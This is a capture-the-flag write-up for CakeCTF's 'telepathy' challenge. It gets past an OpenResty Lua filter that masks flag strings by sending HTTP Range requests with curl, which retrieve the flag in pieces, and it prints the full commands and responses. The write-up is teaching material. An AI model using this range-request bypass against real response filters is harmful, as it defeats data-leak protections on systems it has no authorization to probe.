# telepathy

**Category**: misc \
**Points**: 173 points (29 solves) \
**Author**: theoldmoon0602

HTTP is no longer required. It's time to use telepathy to communicate more
securely and quickly. Here is my PoC: http://misc.cakectf.com:18100

Attachments: `telepathy.tar.gz`

## Overview

```
$ tree
.
├── challenge
│   ├── default.conf
│   ├── Dockerfile.app
│   ├── Dockerfile.nginx
│   ├── go.mod
│   ├── go.sum
│   ├── main.go
│   └── public
│       └── flag.txt
└── docker-compose.yml
```

We have two containers:
1. `Dockerfile.app`
  - Simply prints the flag at `http://app:8000`
  - Uses https://github.com/labstack/echo, a web framework written in Go
2. `Dockerfile.nginx`
  - Contains this config:

```nginx
server {
    listen       80;
    server_name  localhost;

    location / {
        # I'm getting the flag with telepathy...
        proxy_pass  http://app:8000/;

        # I will send the flag to you by HyperTextTelePathy, instead of HTTP
        header_filter_by_lua_block { ngx.header.content_length = nil; }
        body_filter_by_lua_block { ngx.arg[1] = ngx.re.gsub(ngx.arg[1], "\\w*\\{.*\\}", "I'm sending the flag to you by telepathy... Got it?\n"); }
    }
}
```

This is a similar use case as shown [here](https://github.com/openresty/lua-nginx-module/blob/master/README.markdown#L2350):

> When the Lua code may change the length of the response body, then it is
> required to always clear out the Content-Length response header (if any) in a
> header filter to enforce streaming output, as in
>
> ```nginx
>  location /foo {
>      # fastcgi_pass/proxy_pass/...
>
>      header_filter_by_lua_block { ngx.header.content_length = nil }
>      body_filter_by_lua 'ngx.arg[1] = string.len(ngx.arg[1]) .. "\\n"';
>  }
> ```

But anyway, what this line does is it replaces anything that looks like a flag
with a different string:
```lua
ngx.arg[1] = ngx.re.gsub(ngx.arg[1], "\\w*\\{.*\\}", "I'm sending the flag to you by telepathy... Got it?\n");
```

```sh
$ curl http://localhost:8100
I'm sending the flag to you by telepathy... Got it?
```

## Solution

First I read through the labstack/echo source code to see if there was anything
useful. I couldn't find anything, so there had to be some vulnerability in the
nginx configuration:

```http
$ nc localhost 8100
GET / HTTP/1.1
Host: localhost:8100

HTTP/1.1 200 OK
Server: openresty/1.19.3.2
Date: Sun, 29 Aug 2021 20:47:09 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Accept-Ranges: bytes
Last-Modified: Fri, 27 Aug 2021 02:37:41 GMT

35
I'm sending the flag to you by telepathy... Got it?


0
```

Eventually I noticed the `Accept-Ranges: bytes` header. This means that the
server supports
[partial requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#multipart_ranges)!


```
$ curl http://misc.cakectf.com:18100 -i -H "Range: bytes=0-10"
HTTP/1.1 206 Partial Content
Server: openresty/1.19.3.2
Date: Sun, 29 Aug 2021 20:49:43 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Accept-Ranges: bytes
Content-Range: bytes 0-10/28
Last-Modified: Fri, 27 Aug 2021 03:48:29 GMT

CakeCTF{r4n%
```

Nice! And now we can get the rest of the flag:
```
$ curl http://misc.cakectf.com:18100 -i -H "Range: bytes=8-100"
HTTP/1.1 206 Partial Content
Server: openresty/1.19.3.2
Date: Sun, 29 Aug 2021 20:50:19 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Accept-Ranges: bytes
Content-Range: bytes 8-27/28
Last-Modified: Fri, 27 Aug 2021 03:48:29 GMT

r4ng3-0r4ng3-r4ng3}
```

Flag: `CakeCTF{r4ng3-0r4ng3-r4ng3}`
